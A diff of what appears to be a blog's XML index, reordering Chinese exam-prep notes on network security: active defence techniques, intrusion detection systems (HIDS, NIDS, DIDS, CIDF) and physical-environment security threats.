+<li><strong>保护目标</strong>：<strong>通过安全修改处理，使数据可公开发布而不会遭受隐私攻击，并最大可能保留原数据使用价值</strong>。</li>
+<li><strong>核心算法</strong>：<ul>
+<li><strong>k-匿名方法</strong>：对所有元组进行<strong>泛化处理</strong>（不再一一对应），但<strong>容易遭到一致性攻击</strong>。改进方案为 <strong>l-多样性方法</strong>（每个敏感属性至少有<strong>l个不同的值</strong>）。</li>
+<li><strong>差分隐私方法</strong>：通过<strong>添加随机噪声</strong>保护数据。</li>
+</ul>
+</li>
+<li><strong>操作方法</strong>：<strong>抑制</strong>（置空）、<strong>泛化</strong>（降精度）、<strong>置换</strong>（改属主）、<strong>扰动</strong>（加噪声）、<strong>裁剪</strong>（分开发布）。</li>
+<li><strong>脱敏处理</strong>：<strong>匿名化</strong>（<strong>处理后不能被复原</strong>）与 <strong>去标识化</strong>（采用<strong>假名、加密、Hash函数</strong>等置换）。系统敏感口令也常用<strong>Hash函数处理后再保存</strong>。</li>
+</ul>
+<h3 id="9-网络安全前沿技术动向"><a href="#9-网络安全前沿技术动向" class="headerlink" title="9. 网络安全前沿技术动向"></a>9. 网络安全前沿技术动向</h3><ul>
+<li><strong>网络威胁情报</strong>：指<strong>有关网络信息系统遭受安全威胁的信息</strong>（如漏洞、<strong>攻击来源IP、恶意邮箱/域名、攻击工具等</strong>）。</li>
+<li><strong>同态加密</strong>：允许在密文上直接进行计算，解密后的结果与明文计算结果一致（包括加同态、乘同态和全同态）。</li>
+<li><strong>DNS域名安全</strong>：DNS是<strong>逐级授权的分布式数据查询系统（完成域名到IP的翻译）</strong>，分为<strong>递归</strong>和<strong>权威（根、顶级等各级组成）</strong>。主要风险包括：<strong>域名信息篡改、解析配置错误、域名劫持、软件安全漏洞</strong>。</li>
+</ul>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+      <tags>
+        <tag>软考</tag>
       </tags>
   </entry>
   <entry>
@@ -4961,182 +5055,6 @@
       </tags>
   </entry>
   <entry>
-    <title>主动防御技术</title>
-    <url>/2026/03/10/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h2 id="主动防御技术"><a href="#主动防御技术" class="headerlink" title="主动防御技术"></a>主动防御技术</h2><h3 id="1-入侵阻断技术与应用-IPS-SPS"><a href="#1-入侵阻断技术与应用-IPS-SPS" class="headerlink" title="1. 入侵阻断技术与应用 (IPS/SPS)"></a>1. 入侵阻断技术与应用 (IPS/SPS)</h3><ul>
-<li><strong>核心理念</strong>：网络安全的<strong>主动防御</strong>方法，其基本原理是对目标对象的<strong>网络攻击行为进行阻断</strong>。</li>
-<li><strong>技术实现</strong>：<ul>
-<li><strong>入侵防御系统 (IPS)</strong>：根据<strong>网络包的特性及上下文进行攻击行为判断</strong>。为解决性能瓶颈，商用多采用<strong>硬件方式</strong>或基于<strong>旁路阻断 (SPS)</strong>。</li>
-<li><strong>旁路阻断 (SPS)</strong>：一般<strong>对网络延迟影响不大</strong>。</li>
-</ul>
-</li>
-<li><strong>主要作用</strong>：<strong>过滤掉有害的网络信息流，阻断入侵者对目标的攻击行为</strong>。</li>
-</ul>
-<h3 id="2-软件白名单技术与应用"><a href="#2-软件白名单技术与应用" class="headerlink" title="2. 软件白名单技术与应用"></a>2. 软件白名单技术与应用</h3><ul>
-<li><strong>核心原理</strong>：<strong>设置可信任的软件名单列表，以阻止恶意的软件在相关的网络信息系统运行</strong>。</li>
-<li><strong>应用机制</strong>：<ul>
-<li>应用审查设立<strong>初审、复审、终审</strong>三个环节，发布过程分为<strong>公示和发布</strong>两个阶段，以<strong>构建安全、可信的移动互联网安全生态环境</strong>。</li>
-<li><strong>恶意代码防护</strong>：相比黑名单，白名单能更好防范零日漏洞。</li>
-<li><strong>白环境保护</strong>：核心在于“三可信”——<strong>只有可信任的设备才能接入；只有可信任的消息才能传输；只有可信任的软件才允许执行</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="3-网络流量清洗技术与应用"><a href="#3-网络流量清洗技术与应用" class="headerlink" title="3. 网络流量清洗技术与应用"></a>3. 网络流量清洗技术与应用</h3><ul>
-<li><strong>工作原理 (三步曲)</strong>：<ol>
-<li><strong>流量检测</strong>：基于深度包检测 <strong>(DPI)</strong> 识别异常，<strong>快速识别隐藏在背景流量中的攻击包</strong>。</li>
-<li><strong>流量牵引与清洗</strong>：将目标系统的流量<strong>动态转发到流量清洗中心</strong>，<strong>拒绝对指向目标系统的恶意流量进行路由转发</strong>。</li>
-<li><strong>流量回注</strong>：将<strong>清洗后的干净流量回送给目标系统</strong>。</li>
-</ol>
-</li>
-<li><strong>典型应用</strong>：畸形数据报文过滤、抗拒绝服务攻击 (DDoS)、Web应用保护、<strong>DDoS高防IP服务（采用代理转发模式，流量牵引到高防IP）</strong>。</li>
-</ul>
-<h3 id="4-可信计算技术与应用-核心重点"><a href="#4-可信计算技术与应用-核心重点" class="headerlink" title="4. 可信计算技术与应用 (核心重点)"></a>4. 可信计算技术与应用 (核心重点)</h3><ul>
-<li><strong>概念发展</strong>：早期集中于<strong>操作系统的安全机制和容错计算</strong>。由TCPA演进为TCG，制定了<strong>TPM（可信平台模块）</strong>和<strong>TNC（可信网络连接）</strong>标准。</li>
-<li><strong>信任体系</strong>：<strong>TPM是信任根</strong>。包含三个根：<strong>可信度量根RTM</strong>、<strong>可信存储根RTS</strong>、<strong>可信报告根RTR</strong>。目的是<strong>从硬件、BIOS、操作系统等各个层次上增强计算系统平台的可信性</strong>。</li>
-<li><strong>中国标准</strong>：建立起以自主密码算法 <strong>TCM为核心</strong> 的标准，由<strong>可信密码模块(TCM)和TCM服务模块(TSM)</strong>组成。</li>
-<li><strong>TNC 三层架构</strong>：<strong>完整性度量层</strong>（搜集和验证）、<strong>完整性评估层</strong>（评估状况）、<strong>网络访问层</strong>（请求处理与授权）。</li>
-</ul>
-<h3 id="5-数字水印技术与应用"><a href="#5-数字水印技术与应用" class="headerlink" title="5. 数字水印技术与应用"></a>5. 数字水印技术与应用</h3><ul>
-<li><strong>核心原理</strong>：通过<strong>数字信号处理方法，在数字化的媒体文件中嵌入特定的标记</strong>。分为<strong>水印的嵌入和水印的提取</strong>。</li>
-<li><strong>两大核心算法</strong>：<ol>
-<li><strong>空间域方法</strong>：<strong>直接叠加到数字载体的空间域上</strong>。典型如Schyndel算法（即<strong>最低有效位算法 LSB</strong>，按像素点逐一嵌入<strong>最低位上</strong>）和Patchwork算法（改变<strong>统计特性</strong>）。</li>
-<li><strong>变换域方法</strong>：利用<strong>扩展频谱通信技术</strong>和<strong>离散余弦变换(DCT)</strong>，将水印叠加到<strong>DCT域中幅值最大的前L个系数上（不包括直流分量）</strong>。</li>
-</ol>
-</li>
-<li><strong>应用场景</strong>：<strong>版权保护、信息隐藏</strong>（提升保护程度）、<strong>信息溯源、访问控制</strong>。</li>
-</ul>
-<h3 id="6-网络攻击陷阱技术-蜜罐-陷阱网络"><a href="#6-网络攻击陷阱技术-蜜罐-陷阱网络" class="headerlink" title="6. 网络攻击陷阱技术 (蜜罐/陷阱网络)"></a>6. 网络攻击陷阱技术 (蜜罐/陷阱网络)</h3><ul>
-<li><strong>核心理念</strong>：一种<strong>主动的防御方法</strong>，帮助防守方<strong>获得信息优势</strong>。能<strong>消耗攻击者资源、加重工作量、迷惑/跟踪攻击者、制止破坏行为，形成威慑</strong>。</li>
-<li><strong>蜜罐主机技术</strong>：<ul>
-<li><strong>空系统</strong>：<strong>标准的机器，运行着真实完整的OS及程序</strong>，包含<strong>真实系统中的漏洞</strong>。</li>
-<li><strong>镜像系统</strong>：建立<strong>提供敌手感兴趣的服务的服务器镜像</strong>，具有<strong>较强的欺骗性</strong>。</li>
-<li><strong>虚拟系统</strong>：在<strong>真实物理机上运行仿真软件</strong>，运行<strong>多个不同OS（虚拟机）</strong>。</li>
-</ul>
-</li>
-<li><strong>陷阱网络发展</strong>：<ul>
-<li>第一代：<strong>多个设备共同组成</strong>，不对外限制但<strong>对内加强控制</strong>，必须<strong>获取系统活动记录（远程日志、监控软件）</strong>。</li>
-<li>第二代：实现<strong>集成系统</strong>（监控非授权、隐蔽性更强、可积极响应限制非法活动）。</li>
-<li>第三代：<strong>虚拟陷阱网络 (Virtual Honeynets)</strong>，将功能<strong>集中到一个物理设备中运行</strong>。</li>
-</ul>
-</li>
-</ul>
-<h3 id="7-入侵容忍及系统生存技术"><a href="#7-入侵容忍及系统生存技术" class="headerlink" title="7. 入侵容忍及系统生存技术"></a>7. 入侵容忍及系统生存技术</h3><ul>
-<li><strong>核心理念</strong>：<strong>安全3.0理念是容忍入侵</strong>（区别于1.0挡在门外，2.0检测隔离），目标是实现<strong>网络安全弹性，具有容侵能力、可恢复能力</strong>。</li>
-<li><strong>生存性3R方法</strong>：将系统划分为<strong>不可攻破的安全核和可恢复部分</strong>（假定<strong>基本服务不可攻破</strong>）。包含三策略：<strong>抵抗(Resistance)、识别(Recognition)、恢复(Recovery)</strong>。</li>
-<li><strong>关键技术与应用</strong>：<ul>
-<li><strong>分布式共识</strong>（如<strong>区块链</strong>，<strong>众多对等节点组成，去中心化</strong>，避免单一缺陷）。</li>
-<li><strong>门限密码</strong>（如<strong>弹性CA系统</strong>，<strong>容忍一台或多台设备被入侵</strong>，将私钥<strong>分解成若干个数的和</strong>）。</li>
-<li><strong>主动恢复</strong>（周期性<strong>转变到可信状态</strong>）与<strong>多样性设计</strong>（避免通用模式失效）。</li>
-</ul>
-</li>
-</ul>
-<h3 id="8-隐私保护技术与应用"><a href="#8-隐私保护技术与应用" class="headerlink" title="8. 隐私保护技术与应用"></a>8. 隐私保护技术与应用</h3><ul>
-<li><strong>四类隐私</strong>：<strong>身份隐私、属性隐私、社交关系隐私、位置轨迹隐私</strong>。</li>
-<li><strong>保护目标</strong>：<strong>通过安全修改处理，使数据可公开发布而不会遭受隐私攻击，并最大可能保留原数据使用价值</strong>。</li>
-<li><strong>核心算法</strong>：<ul>
-<li><strong>k-匿名方法</strong>：对所有元组进行<strong>泛化处理</strong>（不再一一对应），但<strong>容易遭到一致性攻击</strong>。改进方案为 <strong>l-多样性方法</strong>（每个敏感属性至少有<strong>l个不同的值</strong>）。</li>
-<li><strong>差分隐私方法</strong>：通过<strong>添加随机噪声</strong>保护数据。</li>
-</ul>
-</li>
-<li><strong>操作方法</strong>：<strong>抑制</strong>（置空）、<strong>泛化</strong>（降精度）、<strong>置换</strong>（改属主）、<strong>扰动</strong>（加噪声）、<strong>裁剪</strong>（分开发布）。</li>
-<li><strong>脱敏处理</strong>：<strong>匿名化</strong>（<strong>处理后不能被复原</strong>）与 <strong>去标识化</strong>（采用<strong>假名、加密、Hash函数</strong>等置换）。系统敏感口令也常用<strong>Hash函数处理后再保存</strong>。</li>
-</ul>
-<h3 id="9-网络安全前沿技术动向"><a href="#9-网络安全前沿技术动向" class="headerlink" title="9. 网络安全前沿技术动向"></a>9. 网络安全前沿技术动向</h3><ul>
-<li><strong>网络威胁情报</strong>：指<strong>有关网络信息系统遭受安全威胁的信息</strong>（如漏洞、<strong>攻击来源IP、恶意邮箱/域名、攻击工具等</strong>）。</li>
-<li><strong>同态加密</strong>：允许在密文上直接进行计算，解密后的结果与明文计算结果一致（包括加同态、乘同态和全同态）。</li>
-<li><strong>DNS域名安全</strong>：DNS是<strong>逐级授权的分布式数据查询系统（完成域名到IP的翻译）</strong>，分为<strong>递归</strong>和<strong>权威（根、顶级等各级组成）</strong>。主要风险包括：<strong>域名信息篡改、解析配置错误、域名劫持、软件安全漏洞</strong>。</li>
-</ul>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
-      <tags>
-        <tag>软考</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>入侵检测原理与应用</title>
-    <url>/2026/03/02/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
-    <content><![CDATA[<h2 id="入侵检测系统IDS"><a href="#入侵检测系统IDS" class="headerlink" title="入侵检测系统IDS"></a>入侵检测系统IDS</h2><h3 id="模块一：入侵检测的基础概念与定位"><a href="#模块一：入侵检测的基础概念与定位" class="headerlink" title="模块一：入侵检测的基础概念与定位"></a>模块一：入侵检测的基础概念与定位</h3><p><strong>1. 什么是入侵检测（IDS）？</strong></p>
-<ul>
-<li><strong>概念</strong>：入侵是指违背了目标安全策略的行为。IDS 通过收集操作系统、网络包等信息，来发现这些违规行为。</li>
-<li><strong>判断依据</strong>：对目标的操作是否超出了目标的安全策略范围。</li>
-<li><strong>角色定位</strong>：如果说防火墙是“门卫”，那么 IDS 就是网络中的<strong>预警机</strong>或<strong>巡逻员</strong>。它的直接目的<strong>不是阻断</strong>（那是IPS或防火墙干的事），而是<strong>发现、记录和报警</strong>，为应急响应和取证提供依据。</li>
-</ul>
-<p>传统的入侵检测模型：</p>
-<p><img src="../uploads/IDS1.png" alt=""></p>
-<p><strong>2. CIDF 通用模型（四大组件）</strong><br>现代 IDS 都遵循 CIDF 框架，包含四个部分：</p>
-<ul>
-<li><strong>事件产生器</strong>：负责到处收集数据（抓包、拿日志）。</li>
-<li><strong>事件分析器</strong>：大脑，负责分析数据是否异常。</li>
-<li><strong>响应单元</strong>：依据分析结果做出反应（如发警报）。</li>
-<li><strong>事件数据库</strong>：存储数据和结果。</li>
-</ul>
-<p><img src="../uploads/IDS2.png" alt=""></p>
-<h3 id="模块二：两大核心检测技术流派（重点）"><a href="#模块二：两大核心检测技术流派（重点）" class="headerlink" title="模块二：两大核心检测技术流派（重点）"></a>模块二：两大核心检测技术流派（重点）</h3><p>这是 IDS 最核心的理论，分为“误用检测”和“异常检测”两大流派，外加一些新型辅助技术。</p>
-<p><strong>1. 基于误用的检测（又称：基于特征的检测）</strong></p>
-<ul>
-<li><strong>原理（对号入座）</strong>：建立一个已知攻击的<strong>特征模式库（黑名单）</strong>。如果抓到的数据和库里的特征匹配上了，就认定是入侵。</li>
-<li><strong>优缺点</strong>：优点是<strong>准确率高</strong>，一抓一个准（比如 Snort 规则）；缺点是<strong>高度依赖特征库的更新</strong>，对于库里没有的<strong>新型攻击（未知攻击）毫无办法</strong>。</li>
-<li><strong>具体方法</strong>：状态迁移、条件概率、规则匹配、键盘监控等。</li>
-</ul>
-<p><strong>2. 基于异常的检测</strong></p>
-<ul>
-<li><strong>原理（寻找异类）</strong>：先给系统或用户的正常行为画一个“轮廓”（建立<strong>正常基线/白名单</strong>）。如果当前行为严重偏离了这个正常基线，就认为是异常/入侵。</li>
-<li><strong>优缺点</strong>：优点是<strong>能发现未知的、新型的攻击</strong>；缺点是<strong>误报率极高</strong>（因为“异常”不一定等于“入侵”，比如管理员偶尔半夜登录也会被当成攻击）。</li>
-<li><strong>具体方法</strong>：统计分析、模式预测、文本分类、贝叶斯推理等。</li>
-</ul>
-<p><strong>3. 其他新型检测技术</strong></p>
-<ul>
-<li><strong>沙箱动态分析</strong>：把可疑文件放进一个隔离的“安全屋（沙箱）”里运行，看它有没有搞破坏的动作（专治隐藏极深的木马）。</li>
-<li><strong>报警关联分析</strong>：把海量零碎的报警连起来看，消除噪音，挖出背后复杂的连环攻击。</li>
-<li><strong>攻击诱骗</strong>：故意弄个假系统（蜜罐）吸引黑客攻击，从而反向追踪黑客。</li>
-</ul>
-<h3 id="模块三：IDS-的三大分类及优缺点对比（考点）"><a href="#模块三：IDS-的三大分类及优缺点对比（考点）" class="headerlink" title="模块三：IDS 的三大分类及优缺点对比（考点）"></a>模块三：IDS 的三大分类及优缺点对比（考点）</h3><p>IDS 系统组成：数据采集模块、入侵分析引擎模块、应急处理模块、管理配置模块和其他辅助模块，架构图如下：</p>
-<p><img src="../uploads/IDS3.png" alt=""></p>
-<p>根据<strong>数据来源</strong>和<strong>部署位置</strong>，IDS 分为三大类：</p>
-<p><strong>1. 基于主机的 IDS（HIDS）</strong></p>
-<ul>
-<li><strong>数据源</strong>：主机的系统日志、CPU/内存状态、注册表、文件完整性等。</li>
-<li><strong>部署</strong>：直接以软件形式安装在被保护的服务器上。</li>
-<li><strong>优缺点</strong>：<strong>优点</strong>是不怕网络加密（因为数据到了主机已经解密了），能防范内部人员操作；<strong>缺点</strong>是耗费服务器性能，且一旦服务器被黑，HIDS 本身也可能被破坏。无法看到整个网络的宏观扫描。 HIDS包含软件： SWATCH 监视软件、Tripwire 文件和目录完整性检测工具、网页防篡改。</li>
-</ul>
-<p><strong>2. 基于网络的 IDS（NIDS）</strong></p>
-<ul>
-<li><strong>数据源</strong>：网络上流动的通信数据包。</li>
-<li><strong>部署</strong>：作为一个旁路设备，接在交换机的镜像端口上（静静地旁听）。</li>
-<li><strong>优缺点</strong>：<strong>优点</strong>是不影响现有网络性能，对黑客隐蔽，能监控一大片网络；<strong>缺点</strong>是遇到高加密流量就成了“瞎子”，且在高速网络下容易“漏抓”（漏包）。</li>
-</ul>
-<p><strong>3. 分布式 IDS（DIDS）</strong></p>
-<ul>
-<li><strong>原理</strong>：面对大型复杂网络，采用“多点探测、集中管理”的模式。把 HIDS 和 NIDS 结合起来，统一把情报汇总到一个管理中心进行综合分析。</li>
-</ul>
-<h3 id="模块四：演进产品与实际部署"><a href="#模块四：演进产品与实际部署" class="headerlink" title="模块四：演进产品与实际部署"></a>模块四：演进产品与实际部署</h3><p><strong>1. 产品的演进</strong><br>除了传统的 HIDS 和 NIDS，目前衍生出了更多形态：</p>
-<ul>
-<li><strong>UTM（统一威胁管理）</strong>：把防火墙、IDS、杀毒等功能集成在一个铁盒子（硬件）里。</li>
-<li><strong>APT 检查</strong>：专门针对潜伏深、利用文档（PDF/Word）传播的高级持续性威胁。</li>
-<li><strong>细分领域 IDS</strong>：专盯网页攻击的 Web IDS、专盯数据库违规操作的 数据库 IDS、专盯工业设备的 工控 IDS。</li>
-<li><strong>IDS相关指标</strong>：可靠、可用、时效、准确、安全、可扩展。</li>
-</ul>
-<p><strong>2. 部署规范与方法</strong></p>
-<ul>
-<li><strong>7 步部署法</strong>：确定保护对象 -&gt; 装探测器 -&gt; 定策略 -&gt; 选架构 -&gt; 配规则 -&gt; 测试验证 -&gt; 运行维护。</li>
-<li><strong>经典部署位置</strong>：<ul>
-<li><strong>测内网威胁</strong>：把 NIDS 挂在内网核心交换机的镜像端口上，查内鬼。</li>
-<li><strong>测边界威胁</strong>：把 NIDS 挂在防火墙后面的网络边界处，查外部黑客。</li>
-</ul>
-</li>
-</ul>
-<h3 id="💡-核心总结"><a href="#💡-核心总结" class="headerlink" title="💡 核心总结"></a>💡 核心总结</h3><p>学习 IDS，只需记住一句话：<strong>它是网络里的“监控摄像头”和“警报器”</strong>。它通过<strong>认黑名单（误用特征）</strong>或<strong>找行为反常（异常基线）</strong>来发现坏人。在部署上，装在电脑里的叫 <strong>HIDS</strong>，趴在交换机上偷听的叫 <strong>NIDS</strong>。</p>
-]]></content>
-      <categories>
-        <category>软考</category>
-      </categories>
-      <tags>
-        <tag>软考</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>什么是网闸？</title>
     <url>/2026/03/02/%E4%BB%80%E4%B9%88%E6%98%AF%E7%BD%91%E9%97%B8%EF%BC%9F/</url>
     <content><![CDATA[<p>“网闸（GAP）”这个名字听起来很专业，但其实它的工作原理非常像我们生活中的<strong>“银行防弹玻璃下面的那种旋转递物槽”</strong>，或者叫<strong>“渡船”</strong>。</p>
@@ -5226,6 +5144,88 @@
 <li><strong>P2DR</strong>：<strong>“策略为王”</strong> —— 强调管理，所有的技术手段都要听指挥。</li>
 <li><strong>WPDRRC</strong>：<strong>“攻防兼备”</strong> —— 增加了<strong>预警</strong>（W）和<strong>反击</strong>（C），把安全防御的时间轴向前（预防）和向后（反制）极大地延伸了。</li>
 </ol>
+]]></content>
+      <categories>
+        <category>软考</category>
+      </categories>
+      <tags>
+        <tag>软考</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>入侵检测原理与应用</title>
+    <url>/2026/03/02/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
+    <content><![CDATA[<h2 id="入侵检测系统IDS"><a href="#入侵检测系统IDS" class="headerlink" title="入侵检测系统IDS"></a>入侵检测系统IDS</h2><h3 id="模块一：入侵检测的基础概念与定位"><a href="#模块一：入侵检测的基础概念与定位" class="headerlink" title="模块一：入侵检测的基础概念与定位"></a>模块一：入侵检测的基础概念与定位</h3><p><strong>1. 什么是入侵检测（IDS）？</strong></p>
+<ul>
+<li><strong>概念</strong>：入侵是指违背了目标安全策略的行为。IDS 通过收集操作系统、网络包等信息，来发现这些违规行为。</li>
+<li><strong>判断依据</strong>：对目标的操作是否超出了目标的安全策略范围。</li>
+<li><strong>角色定位</strong>：如果说防火墙是“门卫”，那么 IDS 就是网络中的<strong>预警机</strong>或<strong>巡逻员</strong>。它的直接目的<strong>不是阻断</strong>（那是IPS或防火墙干的事），而是<strong>发现、记录和报警</strong>，为应急响应和取证提供依据。</li>
+</ul>
+<p>传统的入侵检测模型：</p>
+<p><img src="../uploads/IDS1.png" alt=""></p>
+<p><strong>2. CIDF 通用模型（四大组件）</strong><br>现代 IDS 都遵循 CIDF 框架，包含四个部分：</p>
+<ul>
+<li><strong>事件产生器</strong>：负责到处收集数据（抓包、拿日志）。</li>
+<li><strong>事件分析器</strong>：大脑，负责分析数据是否异常。</li>
+<li><strong>响应单元</strong>：依据分析结果做出反应（如发警报）。</li>
+<li><strong>事件数据库</strong>：存储数据和结果。</li>
+</ul>
+<p><img src="../uploads/IDS2.png" alt=""></p>
+<h3 id="模块二：两大核心检测技术流派（重点）"><a href="#模块二：两大核心检测技术流派（重点）" class="headerlink" title="模块二：两大核心检测技术流派（重点）"></a>模块二：两大核心检测技术流派（重点）</h3><p>这是 IDS 最核心的理论，分为“误用检测”和“异常检测”两大流派，外加一些新型辅助技术。</p>
+<p><strong>1. 基于误用的检测（又称：基于特征的检测）</strong></p>
+<ul>
+<li><strong>原理（对号入座）</strong>：建立一个已知攻击的<strong>特征模式库（黑名单）</strong>。如果抓到的数据和库里的特征匹配上了，就认定是入侵。</li>
+<li><strong>优缺点</strong>：优点是<strong>准确率高</strong>，一抓一个准（比如 Snort 规则）；缺点是<strong>高度依赖特征库的更新</strong>，对于库里没有的<strong>新型攻击（未知攻击）毫无办法</strong>。</li>
+<li><strong>具体方法</strong>：状态迁移、条件概率、规则匹配、键盘监控等。</li>
+</ul>
+<p><strong>2. 基于异常的检测</strong></p>
+<ul>
+<li><strong>原理（寻找异类）</strong>：先给系统或用户的正常行为画一个“轮廓”（建立<strong>正常基线/白名单</strong>）。如果当前行为严重偏离了这个正常基线，就认为是异常/入侵。</li>
+<li><strong>优缺点</strong>：优点是<strong>能发现未知的、新型的攻击</strong>；缺点是<strong>误报率极高</strong>（因为“异常”不一定等于“入侵”，比如管理员偶尔半夜登录也会被当成攻击）。</li>
+<li><strong>具体方法</strong>：统计分析、模式预测、文本分类、贝叶斯推理等。</li>
+</ul>
+<p><strong>3. 其他新型检测技术</strong></p>
+<ul>
+<li><strong>沙箱动态分析</strong>：把可疑文件放进一个隔离的“安全屋（沙箱）”里运行，看它有没有搞破坏的动作（专治隐藏极深的木马）。</li>
+<li><strong>报警关联分析</strong>：把海量零碎的报警连起来看，消除噪音，挖出背后复杂的连环攻击。</li>
+<li><strong>攻击诱骗</strong>：故意弄个假系统（蜜罐）吸引黑客攻击，从而反向追踪黑客。</li>
+</ul>
+<h3 id="模块三：IDS-的三大分类及优缺点对比（考点）"><a href="#模块三：IDS-的三大分类及优缺点对比（考点）" class="headerlink" title="模块三：IDS 的三大分类及优缺点对比（考点）"></a>模块三：IDS 的三大分类及优缺点对比（考点）</h3><p>IDS 系统组成：数据采集模块、入侵分析引擎模块、应急处理模块、管理配置模块和其他辅助模块，架构图如下：</p>
+<p><img src="../uploads/IDS3.png" alt=""></p>
+<p>根据<strong>数据来源</strong>和<strong>部署位置</strong>，IDS 分为三大类：</p>
+<p><strong>1. 基于主机的 IDS（HIDS）</strong></p>
+<ul>
+<li><strong>数据源</strong>：主机的系统日志、CPU/内存状态、注册表、文件完整性等。</li>
+<li><strong>部署</strong>：直接以软件形式安装在被保护的服务器上。</li>
+<li><strong>优缺点</strong>：<strong>优点</strong>是不怕网络加密（因为数据到了主机已经解密了），能防范内部人员操作；<strong>缺点</strong>是耗费服务器性能，且一旦服务器被黑，HIDS 本身也可能被破坏。无法看到整个网络的宏观扫描。 HIDS包含软件： SWATCH 监视软件、Tripwire 文件和目录完整性检测工具、网页防篡改。</li>
+</ul>
+<p><strong>2. 基于网络的 IDS（NIDS）</strong></p>
+<ul>
+<li><strong>数据源</strong>：网络上流动的通信数据包。</li>
+<li><strong>部署</strong>：作为一个旁路设备，接在交换机的镜像端口上（静静地旁听）。</li>
+<li><strong>优缺点</strong>：<strong>优点</strong>是不影响现有网络性能，对黑客隐蔽，能监控一大片网络；<strong>缺点</strong>是遇到高加密流量就成了“瞎子”，且在高速网络下容易“漏抓”（漏包）。</li>
+</ul>
+<p><strong>3. 分布式 IDS（DIDS）</strong></p>
+<ul>
+<li><strong>原理</strong>：面对大型复杂网络，采用“多点探测、集中管理”的模式。把 HIDS 和 NIDS 结合起来，统一把情报汇总到一个管理中心进行综合分析。</li>
+</ul>
+<h3 id="模块四：演进产品与实际部署"><a href="#模块四：演进产品与实际部署" class="headerlink" title="模块四：演进产品与实际部署"></a>模块四：演进产品与实际部署</h3><p><strong>1. 产品的演进</strong><br>除了传统的 HIDS 和 NIDS，目前衍生出了更多形态：</p>
+<ul>
+<li><strong>UTM（统一威胁管理）</strong>：把防火墙、IDS、杀毒等功能集成在一个铁盒子（硬件）里。</li>
+<li><strong>APT 检查</strong>：专门针对潜伏深、利用文档（PDF/Word）传播的高级持续性威胁。</li>
+<li><strong>细分领域 IDS</strong>：专盯网页攻击的 Web IDS、专盯数据库违规操作的 数据库 IDS、专盯工业设备的 工控 IDS。</li>
+<li><strong>IDS相关指标</strong>：可靠、可用、时效、准确、安全、可扩展。</li>
+</ul>
+<p><strong>2. 部署规范与方法</strong></p>
+<ul>
+<li><strong>7 步部署法</strong>：确定保护对象 -&gt; 装探测器 -&gt; 定策略 -&gt; 选架构 -&gt; 配规则 -&gt; 测试验证 -&gt; 运行维护。</li>
+<li><strong>经典部署位置</strong>：<ul>
+<li><strong>测内网威胁</strong>：把 NIDS 挂在内网核心交换机的镜像端口上，查内鬼。</li>
+<li><strong>测边界威胁</strong>：把 NIDS 挂在防火墙后面的网络边界处，查外部黑客。</li>
+</ul>
+</li>
+</ul>
+<h3 id="💡-核心总结"><a href="#💡-核心总结" class="headerlink" title="💡 核心总结"></a>💡 核心总结</h3><p>学习 IDS，只需记住一句话：<strong>它是网络里的“监控摄像头”和“警报器”</strong>。它通过<strong>认黑名单（误用特征）</strong>或<strong>找行为反常（异常基线）</strong>来发现坏人。在部署上，装在电脑里的叫 <strong>HIDS</strong>，趴在交换机上偷听的叫 <strong>NIDS</strong>。</p>
 ]]></content>
       <categories>
         <category>软考</category>
@@ -6717,111 +6717,6 @@
       </tags>
   </entry>
   <entry>
-    <title>物理环境安全分析与防护</title>
-    <url>/2026/02/04/%E7%89%A9%E7%90%86%E7%8E%AF%E5%A2%83%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E4%B8%8E%E9%98%B2%E6%8A%A4/</url>
-    <content><![CDATA[<h3 id="一、-物理安全的基本概念"><a href="#一、-物理安全的基本概念" class="headerlink" title="一、 物理安全的基本概念"></a>一、 物理安全的基本概念</h3><ol>
-<li><strong>定义</strong>：<ul>
-<li>传统上称为“实体安全”。</li>
-<li>它是网络信息系统安全、可靠、不间断运行的<strong>基本保证</strong>。</li>
-<li><strong>核心目标</strong>：保护支持系统运行的硬件（环境、设备、记录介质），防止因自然或人为因素导致信息丢失、泄露、破坏或服务中断。</li>
-</ul>
-</li>
-<li><strong>广义定义</strong>：<ul>
-<li>指由硬件、软件、操作人员、环境组成的“人、机、物”融合的网络信息物理系统的安全。</li>
-</ul>
-</li>
-</ol>
-<h3 id="二、-物理安全威胁分析"><a href="#二、-物理安全威胁分析" class="headerlink" title="二、 物理安全威胁分析"></a>二、 物理安全威胁分析</h3><p>威胁主要分为两大类：传统威胁与新型硬件威胁。</p>
-<h4 id="1-常见（传统）威胁"><a href="#1-常见（传统）威胁" class="headerlink" title="1. 常见（传统）威胁"></a>1. 常见（传统）威胁</h4><ul>
-<li><strong>自然威胁</strong>：地震、洪水、火灾、鼠害、雷电等。</li>
-<li><strong>人为威胁</strong>：盗窃、爆炸、毁坏、硬件攻击等。</li>
-</ul>
-<h4 id="2-新型硬件威胁"><a href="#2-新型硬件威胁" class="headerlink" title="2. 新型硬件威胁"></a>2. 新型硬件威胁</h4><p>具有隐蔽性、危害性、攻击主动性和非临近性。</p>
-<ul>
-<li><strong>硬件木马</strong>：<ul>
-<li>指在集成电路（IC）全生命周期（研发、制造、封装、应用）中植入的恶意电路。</li>
-<li>激活后会导致信息泄露或功能失控。</li>
-</ul>
-</li>
-<li><strong>硬件协同的恶意代码</strong>：利用硬件特性，使非授权软件访问特权内存区域。</li>
-<li><strong>硬件安全漏洞利用</strong>：<ul>
-<li>具有持久性和破坏性。</li>
-<li><strong>典型案例</strong>：2018年的“熔断”（Meltdown）和“幽灵”（Spectre）CPU漏洞，通过侧信道攻击获取缓存数据。</li>
-</ul>
-</li>
-<li><strong>基于软件漏洞攻击硬件实体</strong>：<ul>
-<li>利用控制系统软件漏洞修改物理配置，破坏硬件。</li>
-<li><strong>典型案例</strong>：“震网”（Stuxnet）病毒。</li>
-</ul>
-</li>
